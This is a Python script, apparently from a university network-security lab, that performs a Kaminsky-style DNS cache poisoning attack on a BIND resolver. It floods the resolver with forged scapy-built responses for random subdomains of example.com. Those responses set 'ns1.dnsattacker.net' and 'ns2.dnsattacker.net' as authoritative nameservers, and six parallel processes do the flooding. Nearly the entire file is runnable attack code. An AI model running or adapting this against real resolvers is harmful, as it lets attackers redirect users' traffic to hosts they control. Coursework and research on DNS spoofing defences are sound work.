#!/usr/bin/env python
import argparse
import socket
from multiprocessing import Process
from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits
from scapy.layers.dns import DNS


parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = '128.100.8.174'
# your bind's port (DNS queries are send to this port)
my_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))


'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):

    sock.sendto(str(packet), (ip, port))

def SendDNSReplies(dnsPacket):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sendPacket(sock, dnsPacket, my_ip, my_query_port)

'''
Example code that sends a DNS query using scapy.
'''
def SendDNSQuery(qname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=qname))
    sendPacket(sock, dnsPacket, my_ip, my_port)


def generateAttackDNSResponse(response):
    # configuring DNS fields
    response.an.ttl = 85063
    response.nscount = 2
    response.aa = response.qr
    response.arcount = 0

    if response.an != None:
        response.an.rdata = "5.6.6.8"
    if response.ar != None:
        del response.ar
    limit = max(response.nscount, 2)
    #print limit
    for count in xrange(limit - 1, -1 ,-1 ):
        #print count
        if count <= 1:
            #print "count is less than 1"
            if count == 0 and response.ns[0] != None:
                response.ns[0].rdata = "ns1.dnsattacker.net"
            if count == 0 and response.ns[0] == None:
                response.ns[0] = response.an
                response.ns[0].rdata = "ns1.dnsattacker.net"
                response.ns[0].type = "NS"

            if count == 1 and response.nscount > 1:
                response.ns[1].rdata = "ns2.dnsattacker.net"
        else:
            del response.ns[count]
    #print response.show()
    return response

def attack():

    # generating template DNS response from google.ca
    exampleQname = 'google.ca'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=exampleQname))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    templateDNSResponse = sock.recv(4096)

    #modifying the template DNS response to the attack response
    templateDNSResponse = DNS(templateDNSResponse)
    attackDNSResponse = generateAttackDNSResponse(templateDNSResponse)

    #define the attack target
    attackQname = 'example.com'

    #renaming the DNS component to attack target
    attackDNSResponse.ns[0].rrname = attackQname
    attackDNSResponse.ns[1].rrname = attackQname
    # if attackDNSResponse.ar != None:
    #     del attackDNSResponse.ar
    #print attackDNSResponse.show()

    while True:
        # generating random subdomain urls
        randomQname = getRandomSubDomain() + '.' + attackQname

        #renaming the DNS component to random subdomain url
        attackDNSResponse.qd.qname = randomQname
        attackDNSResponse.an.rrname = randomQname

        #send the query
        SendDNSQuery(randomQname)
        count = 0
        while count < 100:
            #try to send reponse with random ID to let server cache our response
            attackDNSResponse.id=getRandomTXID()
            SendDNSReplies(attackDNSResponse)
            count = count + 1

# creating multiple processing for attacking
p0 = Process(target=attack)
p1 = Process(target=attack)
p2 = Process(target=attack)
p3 = Process(target=attack)
p4 = Process(target=attack)
p5 = Process(target=attack)

#starting the processes.
p0.start()
p1.start()
p2.start()
p3.start()
p4.start()
p5.start()